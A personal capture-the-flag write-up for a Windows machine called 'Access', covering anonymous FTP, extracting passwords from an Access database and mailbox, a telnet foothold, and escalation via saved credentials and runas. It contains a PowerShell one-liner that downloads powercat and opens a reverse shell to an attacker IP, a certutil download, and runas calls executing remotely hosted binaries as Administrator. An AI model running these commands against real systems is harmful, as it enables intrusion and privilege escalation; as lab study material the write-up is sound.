# Access Writeup

Name: Access
Date:  7/5/2023
Difficulty: Easy  
Goals:  
- No help
Learnt:
- Trolls exist
- Threads of exploration in this case required direct drill not piece finding from else where...
Beyond Root:
- Sliver basics

- [[Access-Notes]]
- [[Access-CMD-by-CMDs.md]]

## Recon

The time to live(TTL) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](OS-ProvingGrounds/Apex/Screenshots/ping.png)

## FTP anonymous access and dumping the database

With nmap finished and bruteforcing directories in the background one of the mysteries of this machines if the LON-MC6. Regardless to its lack of answer along with the other trolly stuff in this machine - they were not rabbitholes just trolly nonsense. There were rabbitholes, though just pointing out a distinction.

There is a telnet vulnerablity that was not used
https://support.microsoft.com/en-us/topic/ms09-042-vulnerability-in-telnet-could-allow-remote-code-execution-7d71e702-0539-73ab-dbbe-2ac5502c8420 - no info, but it more a hint for our only point of connect, if I had waited I would seen it ask for credentials. But the FTP has anonymous access, which were I started originally

![](dumpingftp.png)

A database type for Office. https://en.wikipedia.org/wiki/Microsoft_Access, which kali has packaged tools for in 2023 so I installed [mbdtools](https://www.kali.org/tools/mdbtools/)
```bash
# mdbtools for mdb databse
# pstutils for the .pst file 
sudo apt install mdbtools pstutils
```

Enumerating for exploits and specific considerations
![](JET4.png)

Extracted all the tables 
```bash
mdb-tables backup.mdb > all-tables
```

Then hex dumped the backup to confirm that there are passwords somewhere in the dump - one good idea I had as again the troll leads to LON and etc..
```bash
mdb-hexdump backup.mdb
```

![](afavouriteword.png)

Each table is convertable to C arrays so I create a script to dumped all the tables and found the passwords: 
![](creds.png)

This seems weird
![](3333s.png)

After completing the machine I want to check that this was the hash it 
333333333333333333333333333333333333333333333333333333333
BE60317F2494EEF7471195EBBA254DA9


access4u@security is password for 'Access Control.zip'
![](passwordaccountandversions.png)

https://linux.die.net/man/1/readpst
```bash
readpst Access\ Control.pst
cat Access\ Control.mbox
```

John Carter is mentioned in USERINFO.c
![](johncarter.png)

https://vulners.com/nessus/SMB_NT_MS09-042.NASL - trick a user or SSRF with telnet 

## Foothold

Telneting in with the security account
![](security-4Cc3ssC0ntr0ller.png)

## PrivEsc

![](yawcam.png)
https://packetstormsecurity.com/files/145770/Yawcam-0.6.0-Directory-Traversal.html

```powershell
%USER%.yawcam

type .yawcam\ver.dat
0.6.2
http://www.yawcam.com/ver.dat
http://home.bitcom.se/yawcam_files/ver.dat


```
https://www.yawcam.com/

![](systeminfo.png)

Sad Netdogs and Netcats
![](netdogssaddogs.png)

All executables are blocked by group policy

![](ZKTeco.png)

```powershell
# Access denied - icacls you fool 
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.16/powercat.ps1');powercat -c 10.10.14.16 -p 8000 -i C:\ZKTeco\ZKAccess3.5"
# Icacls just because
icacls C:\ZKTeco\ZKAccess3.5
```

yawcam settings file 176.26.141.32:8080 is referenced
![](no172conn.png)
```powershell
# Lead to nothing
certutil.exe -urlcache -split -f http://176.26.141.32:8080 wwwroot
```


https://learn.microsoft.com/en-us/previous-versions/windows/desktop/policy/group-policy-objects

WTF is LON-MC6 router?
yawcam is security camera - faq mentions port forwarding - but no binaries are aloud

![](alotsofperms.png)
[exploitdb](https://www.exploit-db.com/exploits/40323) - we can basically modify because we can append, read and write data. I am happy I found this without searching for exploitdb. 

```
icalcs C:\ZKTeco\ZKAccess3.5
```

![](icaclzkaccessexes.png)


But we cant modify dlls or write dll unless we can find phantom dlls that get loaded [hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking)
![](dllhijackingtypes.png)

WTF is LON-MC6 

telnet clients group

```powershell
# a backup of the primary Bootsect.dos created by old Windows OSs
C:\BOOTSECT.BAK
# 
C:\ZKTeco\ZKAccess3.5

But I had not found how Administrator would run in scheduled tasks, I would either need find a phantom dll by copying binaries and running them with procmon. 
```


https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/patched-microsoft-access-mdb-leaker-cve-2019-1463-exposes-sensitive-data-in-database-files

I decided that I need to comb the system like a dentist.
```powershell
# No Password in:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```


![](tasklistforntsystem.png)

Unattended password trolling
![](pantherunatttendxmltroll.png)

This felt like the kick in the balls as I threw out a strict dentist approach for more target problem solving approach.
![](bingobangobongo.png)
This machine is such troll of a machine.

For some reason possible group policy I could not run this from a remote share. 
```powershell
# Start SMB share
# No password as we dont have powershell
impacket-smbserver Share $(pwd) -smb2support

cmdkey /list
runas /savecred /user:ACCESS\Administrator "\\10.10.14.16\Share\GIGANTIC_SCREEN.exe"
runas /savecred /user:ACCESS\Administrator "\\10.10.14.16\Share\RIGID_NANOPARTICLE.exe"
runas /savecred /user:ACCESS\Administrator

```
Because we can connect back we `runas`
![](hashcapturewithresponder.png)

- Networking of yawcam
- Services
- cmd.exe is still running as Administrator

There is no [LGPO.exe](https://learn.microsoft.com/en-us/archive/blogs/secguide/lgpo-exe-local-group-policy-object-utility-v1-0) on Windows 2008

```powershell
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"
netsh firewall set portopening protocol = TCP port = 3389 name = "Remote Desktop Protocol" mode = ENABLE Ok
```

Considering the another troll of the cmdkey - [Runas](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)

I reran a nmap scan after discovering more ports. This machine is very trolly
ehports.png

I decided that Ghost dll and runas with cmdkey /list maybe it wanted to really specificly only run Access.exe as in the GPO that I cant access becase reason given previously and there is a whitelist. Then I could the transfer of Access.exe to work. 

![](revengineertears.png)

But I had not found how Administrator would run in scheduled tasks, I would either need find a phantom dll by copying binaries and running them with procmon.  But it requires login https://www.zkteco.com/en/ZKAccess_3/ZKAccess3.5, which a rabbit hole indicator.

https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#hosts-file bottom up reading

https://learn.microsoft.com/en-us/windows-server/identity/software-restriction-policies/administer-software-restriction-policies

Tried to add the 176.26.141.32 to the arp table, there is not curl or wget
![](notcoolenough.png)

It is also not up
![](notup.png)
yawcam - 2 directory exist
![](2diffs.png)


And there is no yawcam process
![](noyawcamprocess.png)

There was also a no cmd.exe from system today...
![](therewassystemcmdbutnoanymore.png)

I went to forum for a hint - but it is just use runas, which I knew so I not doing to downgrade this.

![](whynotsliver.png)

Now knowing that msfvenom works.. But sliver works from C:\temp and I am sure I tried that already...

There was a considerable degree of salt residure in my brain from doing this this machine and although I do not strictly like rating machines for fun or realism I really felt that this machine is actually really bad as a learning execise other than: 
- weird database RFTM 
- Working around GPOs

Other than that. 
![](cat.png)

## Beyond Root

See [[Access-Notes]] for Sliver usage
